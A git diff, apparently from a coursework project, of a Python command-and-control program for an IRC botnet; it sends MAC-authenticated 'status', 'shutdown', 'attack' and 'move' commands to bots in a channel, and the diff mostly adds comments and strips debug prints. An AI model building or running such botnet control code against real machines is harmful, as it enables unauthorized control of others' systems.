@@ -1,3 +1,4 @@
+#!/usr/bin/env python
 # controller program for the ircbot.py program
 
 #command line argument:
@@ -14,8 +15,10 @@ from array import *
 import uuid
 import select
 
+# List of used nonces
 used_nonces = list()
 
+# Argument Parsing
 def parse_args():
     parser = argparse.ArgumentParser(
         prog='client',
@@ -25,17 +28,18 @@ def parse_args():
     parser.add_argument('secret', help='secret-phrase')
     return parser.parse_args()
 
-
+# Get random nonce make sure it hasnt been used before
 def calc_nonce():
-    #get random nonce make sure it hasnt been used before
+    # Generate nonce
     nonce = uuid.uuid4().hex    
     while(nonce in used_nonces):
         nonce = uuid.uuid4().hex
 
-    #print("nonce: ", uuid.uuid4().hex)
+    # After generating, put in used list
     used_nonces.append(nonce)
     return nonce
 
+# Message Parsing
 def parse_message(data: str):
 
     print("parsing: \n", data)
@@ -58,7 +62,7 @@ def parse_message(data: str):
     command = channel_message.pop(0)
     return prefix, command, channel_message
 
-
+# Receive status data from all bots, parsed so every bot's output is received
 def recieve_status_data(sock: socket, channel: str):
     i = 0
     j = 0
@@ -78,16 +82,14 @@ def recieve_status_data(sock: socket, channel: str):
             #waits for 5 seconds
             i = i + 1
     
-    #find_bot = []
     for elem in bot_status:
+
         if(elem.find('! \r\n')):
-            #print(elem.split('! \r\n'))
             elem_split = elem.split('\r\n')
-            #find_bot.append(elem_split)
+            
             for elem2 in elem_split:
-                #if(elem2.find('shutdown') or elem2.find('status')):
                 find_bot.append(elem2)
-                #print(elem2)
+
                 if(elem2.find("QUIT") != -1):
                     find_bot.remove(elem2)
     
@@ -99,28 +101,28 @@ def recieve_status_data(sock: socket, channel: str):
 
             find_bot.remove(i)
 
-    #print("BOT FOUND: ", find_bot)
-
     print("Result: ", len(find_bot), " bots discovered.")
     status_string = ""
     for bot in find_bot:
         print(bot)
 
 
+# Main bot controller
 def bot_controller(args: str, sock: socket):
 
+    # Separate arguments into usable variables
     split_hostPort = args.hostname_port.split(":")
     host = split_hostPort[0]
     port = int(split_hostPort[1])
     secret = args.secret
     channel = "#" + args.channel
-
     command = input('cmd> ')
+
+
     while (1):
 
         # Flush data that was sent from bots
-        #if a bot is created after the controller is turned on then will recieve extra input
-        #response = sock.recv(1024).decode()
+        # If a bot is created after the controller is turned on then will recieve extra input
         read_data = [sock]
         write_data = []
         error_data = []
@@ -130,73 +132,69 @@ def bot_controller(args: str, sock: socket):
             print("recieved new data from bots: ")
             print(response)
 
-
+        # Sending status command to bot
         if command == "status":
-            print("command status")
+            # Calculate a nonce and MAC for this command
             print(channel)
             nonce = calc_nonce()
             mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
-            #print("mac: ", mac[0:8])
 
-            #nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
+            # Send the command
             nonce_mac_cmd = 'PRIVMSG ' + channel + " :" + nonce + " " + mac[0:8] + " " + command + '! \r\n'
-            #print("send command: ", nonce_mac_cmd)
             sock.send(nonce_mac_cmd.encode())
+
+
             recieve_status_data(sock, channel)
 
+        # Sending shutdown command to bot
         elif command == "shutdown":
-            #print("telling bot to shutdown")
-            print("command shutdown")
+            # Calculate a nonce and MAC for this command
             nonce = calc_nonce()
             mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
-            #print("mac: ", mac[0:8])
 
-            #nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
+            # Send the command
             nonce_mac_cmd = 'PRIVMSG ' + channel + " :" + nonce + " " + mac[0:8] + " " + command + '! \r\n'
-            #print("send command: ", nonce_mac_cmd)
             sock.send(nonce_mac_cmd.encode())
-            recieve_status_data(sock, channel)
-            #recieve_shutdown_data(sock)
 
+            recieve_status_data(sock, channel)
+
+        # Sending attack command to bot
         elif command[0:6] == "attack":
-            print("attack command")
+            # Calculate a nonce and MAC for this command
             nonce = calc_nonce()
             mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
-            #print("mac: ", mac[0:8])
 
-            #nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
+            # Send the command
             nonce_mac_cmd = 'PRIVMSG ' + channel + " :" + nonce + " " + mac[0:8] + " " + command + '! \r\n'
-            #print("send command: ", nonce_mac_cmd)
             sock.send(nonce_mac_cmd.encode())
 
+            # Receive the bot reply
             recieve_status_data(sock, channel)
-            #recieve_attack_data(sock)
 
+        # Sending move command to bot
         elif command[0:4] == "move":
-            print("move command")
+            # Calculate a nonce and MAC for this command
             nonce = calc_nonce()
             mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
-            #print("mac: ", mac[0:8])
 
-            #nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
+            # Send the command
             nonce_mac_cmd = 'PRIVMSG ' + channel + " :" + nonce + " " + mac[0:8] + " " + command + '! \r\n'
-            #print("send command: ", nonce_mac_cmd)
             sock.send(nonce_mac_cmd.encode())
 
+            # Receive the bot reply
             recieve_status_data(sock, channel)
-            #recieve_attack_data(sock)
+
+        # Command to close controller
         elif command == "quit":
             print("Bye.")
             exit(1)
+
         else:
             print("unknown command.")
-
-
 
         command = input('cmd> ')
     sock.send(command.encode)
     sock.close()
-
 
 
 def main():
